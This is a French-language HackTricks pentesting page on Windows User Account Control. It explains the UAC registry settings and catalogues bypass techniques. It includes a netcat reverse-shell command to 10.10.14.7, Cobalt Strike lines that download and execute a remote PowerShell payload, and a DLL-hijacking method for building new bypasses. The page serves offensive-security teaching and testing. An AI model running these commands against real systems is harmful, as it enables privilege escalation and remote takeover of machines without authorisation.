# UAC - User Account Control

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Accédez dès aujourd'hui:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) est une fonctionnalité qui permet une **demande de consentement pour les activités élevées**. Les applications ont différents niveaux d'`intégrité`, et un programme avec un **niveau élevé** peut effectuer des tâches qui **pourraient compromettre le système**. Lorsque UAC est activé, les applications et les tâches s'exécutent toujours sous le contexte de sécurité d'un compte non administrateur, sauf si un administrateur autorise explicitement ces applications/tâches à avoir un accès de niveau administrateur au système pour s'exécuter. Il s'agit d'une fonctionnalité de commodité qui protège les administrateurs contre les modifications non intentionnelles mais qui n'est pas considérée comme une limite de sécurité.

Pour plus d'informations sur les niveaux d'intégrité:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Lorsque UAC est en place, un utilisateur administrateur se voit attribuer 2 jetons : une clé d'utilisateur standard, pour effectuer des actions régulières en tant que niveau standard, et une avec les privilèges d'administrateur.

Cette [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discute en profondeur du fonctionnement de UAC et inclut le processus de connexion, l'expérience utilisateur et l'architecture de UAC. Les administrateurs peuvent utiliser des stratégies de sécurité pour configurer le fonctionnement de UAC spécifique à leur organisation au niveau local (en utilisant secpol.msc), ou configuré et déployé via des objets de stratégie de groupe (GPO) dans un environnement de domaine Active Directory. Les différents paramètres sont discutés en détail [ici](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Il existe 10 paramètres de stratégie de groupe qui peuvent être définis pour UAC. Le tableau suivant fournit des détails supplémentaires :

| Paramètre de stratégie de groupe                                                                                                                                                                                                                                                                                                                                                   | Clé de Registre             | Paramètre par défaut                                         |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Désactivé                                                    |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Désactivé                                                    |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Demande de consentement pour les binaires non-Windows        |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Demande d'informations d'identification sur le bureau sécurisé |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Activé (par défaut pour la maison) Désactivé (par défaut pour l'entreprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Désactivé                                                    |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Activé                                                       |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Activé                                                       |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Activé                                                       |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Activé                                                       |
### Théorie de contournement de l'UAC

Certains programmes sont **automatiquement élevés** si l'**utilisateur appartient** au **groupe administrateur**. Ces binaires ont à l'intérieur de leurs _**Manifestes**_ l'option _**autoElevate**_ avec la valeur _**True**_. Le binaire doit également être **signé par Microsoft**.

Ainsi, pour **contourner** l'**UAC** (passer du niveau d'intégrité **moyen** au niveau **élevé**), certains attaquants utilisent ce type de binaires pour **exécuter du code arbitraire** car il sera exécuté à partir d'un **processus de niveau d'intégrité élevé**.

Vous pouvez **vérifier** le _**Manifeste**_ d'un binaire en utilisant l'outil _**sigcheck.exe**_ de Sysinternals. Et vous pouvez **voir** le **niveau d'intégrité** des processus en utilisant _Process Explorer_ ou _Process Monitor_ (de Sysinternals).

### Vérifier l'UAC

Pour confirmer si l'UAC est activé, faites :
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Si c'est **`1`**, alors UAC est **activé**, si c'est **`0`** ou si cela **n'existe pas**, alors UAC est **inactif**.

Ensuite, vérifiez **quel niveau** est configuré :
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Si **`0`** alors, UAC ne demandera pas (comme **désactivé**)
* Si **`1`** l'administrateur est **demandé pour le nom d'utilisateur et le mot de passe** pour exécuter le binaire avec des droits élevés (sur le Bureau sécurisé)
* Si **`2`** (**Me notifier toujours**) UAC demandera toujours une confirmation à l'administrateur lorsqu'il essaie d'exécuter quelque chose avec des privilèges élevés (sur le Bureau sécurisé)
* Si **`3`** comme `1` mais pas nécessaire sur le Bureau sécurisé
* Si **`4`** comme `2` mais pas nécessaire sur le Bureau sécurisé
* si **`5`** (**par défaut**) il demandera à l'administrateur de confirmer l'exécution des binaires non Windows avec des privilèges élevés

Ensuite, vous devez vérifier la valeur de **`LocalAccountTokenFilterPolicy`**\
Si la valeur est **`0`**, alors, seul l'utilisateur RID 500 (**Administrateur intégré**) peut effectuer des **tâches d'administration sans UAC**, et si elle est `1`, **tous les comptes du groupe "Administrateurs"** peuvent le faire.

Et, enfin, vérifiez la valeur de la clé **`FilterAdministratorToken`**\
Si **`0`** (par défaut), le **compte Administrateur intégré peut** effectuer des tâches d'administration à distance et si **`1`** le compte intégré Administrateur **ne peut pas** effectuer des tâches d'administration à distance, sauf si `LocalAccountTokenFilterPolicy` est défini sur `1`.

#### Résumé

* Si `EnableLUA=0` ou **n'existe pas**, **pas de UAC pour personne**
* Si `EnableLua=1` et **`LocalAccountTokenFilterPolicy=1` , Pas de UAC pour personne**
* Si `EnableLua=1` et **`LocalAccountTokenFilterPolicy=0` et `FilterAdministratorToken=0`, Pas de UAC pour RID 500 (Administrateur intégré)**
* Si `EnableLua=1` et **`LocalAccountTokenFilterPolicy=0` et `FilterAdministratorToken=1`, UAC pour tout le monde**

Toutes ces informations peuvent être obtenues en utilisant le module **metasploit**: `post/windows/gather/win_privs`

Vous pouvez également vérifier les groupes de votre utilisateur et obtenir le niveau d'intégrité:
```
net user %username%
whoami /groups | findstr Level
```
## Contournement de l'UAC

{% hint style="info" %}
Notez que si vous avez un accès graphique à la victime, le contournement de l'UAC est simple car vous pouvez simplement cliquer sur "Oui" lorsque la fenêtre de l'UAC apparaît.
{% endhint %}

Le contournement de l'UAC est nécessaire dans la situation suivante : **l'UAC est activé, votre processus s'exécute dans un contexte d'intégrité moyenne et votre utilisateur appartient au groupe des administrateurs**.

Il est important de mentionner qu'il est **beaucoup plus difficile de contourner l'UAC s'il est au niveau de sécurité le plus élevé (Toujours) que s'il est à l'un des autres niveaux (Par défaut).**

### UAC désactivé

Si l'UAC est déjà désactivé (`ConsentPromptBehaviorAdmin` est **`0`**), vous pouvez **exécuter un shell inversé avec des privilèges d'administrateur** (niveau d'intégrité élevé) en utilisant quelque chose comme :
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Contournement de l'UAC avec duplication de jeton

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Très** basique contournement de l'UAC (accès complet au système de fichiers)

Si vous avez un shell avec un utilisateur qui est dans le groupe Administrateurs, vous pouvez **monter le partage C$** via SMB (système de fichiers) localement sur un nouveau disque et vous aurez **accès à tout à l'intérieur du système de fichiers** (même le dossier personnel de l'administrateur).

{% hint style="warning" %}
**Il semble que cette astuce ne fonctionne plus**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Contournement de l'UAC avec Cobalt Strike

Les techniques de Cobalt Strike ne fonctionneront que si l'UAC n'est pas réglé à son niveau de sécurité maximal
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** et **Metasploit** ont également plusieurs modules pour **contourner** le **UAC**.

### KRBUACBypass

Documentation et outil sur [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits de contournement du UAC

[**UACME**](https://github.com/hfiref0x/UACME) qui est une **compilation** de plusieurs exploits de contournement du UAC. Notez que vous devrez **compiler UACME en utilisant Visual Studio ou MSBuild**. La compilation créera plusieurs exécutables (comme `Source\Akagi\outout\x64\Debug\Akagi.exe`), vous devrez savoir **lequel vous avez besoin**.\
Vous devriez **être prudent** car certains contournements **peuvent déclencher d'autres programmes** qui alerteront **l'utilisateur** qu'il se passe quelque chose.

UACME indique la **version de build à partir de laquelle chaque technique a commencé à fonctionner**. Vous pouvez rechercher une technique affectant vos versions :
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
De plus, en utilisant [cette](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) page, vous obtenez la version Windows `1607` à partir des versions de build.

#### Plus de contournements UAC

**Toutes** les techniques utilisées ici pour contourner l'UAC **nécessitent** un **shell interactif complet** avec la victime (un shell nc.exe classique n'est pas suffisant).

Vous pouvez obtenir une session **meterpreter**. Migrez vers un **processus** dont la valeur **Session** est égale à **1** :

![](<../../.gitbook/assets/image (860).png>)

(_explorer.exe_ devrait fonctionner)

### Contournement de l'UAC avec GUI

Si vous avez accès à une **GUI, vous pouvez simplement accepter la demande UAC** lorsque vous l'obtenez, vous n'avez pas vraiment besoin d'un contournement. Ainsi, l'accès à une GUI vous permettra de contourner l'UAC.

De plus, si vous obtenez une session GUI que quelqu'un utilisait (potentiellement via RDP), il y a **des outils qui s'exécuteront en tant qu'administrateur** à partir desquels vous pourriez **exécuter** une **cmd** par exemple **en tant qu'admin** directement sans être à nouveau sollicité par l'UAC comme [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Cela pourrait être un peu plus **furtif**.

### Contournement bruyant de l'UAC par force brute

Si vous ne vous souciez pas d'être bruyant, vous pourriez toujours **exécuter quelque chose comme** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) qui **demande d'élever les permissions jusqu'à ce que l'utilisateur l'accepte**.

### Votre propre contournement - Méthodologie de base de contournement de l'UAC

Si vous jetez un œil à **UACME**, vous remarquerez que **la plupart des contournements de l'UAC exploitent une vulnérabilité de détournement de Dll** (principalement en écrivant la dll malveillante sur _C:\Windows\System32_). [Lisez ceci pour apprendre à trouver une vulnérabilité de détournement de Dll](../windows-local-privilege-escalation/dll-hijacking/).

1. Trouvez un binaire qui **s'autoélève** (vérifiez que lorsqu'il est exécuté, il s'exécute à un niveau d'intégrité élevé).
2. Avec procmon, trouvez les événements "**NOM NON TROUVÉ**" qui peuvent être vulnérables au **détournement de DLL**.
3. Vous devrez probablement **écrire** la DLL à l'intérieur de certains **chemins protégés** (comme C:\Windows\System32) où vous n'avez pas les autorisations d'écriture. Vous pouvez contourner cela en utilisant :
1. **wusa.exe** : Windows 7, 8 et 8.1. Il permet d'extraire le contenu d'un fichier CAB à l'intérieur de chemins protégés (car cet outil est exécuté à partir d'un niveau d'intégrité élevé).
2. **IFileOperation** : Windows 10.
4. Préparez un **script** pour copier votre DLL à l'intérieur du chemin protégé et exécuter le binaire vulnérable et autoélevé.

### Une autre technique de contournement de l'UAC

Consiste à surveiller si un **binaire autoélevé** tente de **lire** du **registre** le **nom/chemin** d'un **binaire** ou **commande** à **exécuter** (ceci est plus intéressant si le binaire recherche ces informations à l'intérieur du **HKCU**).

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
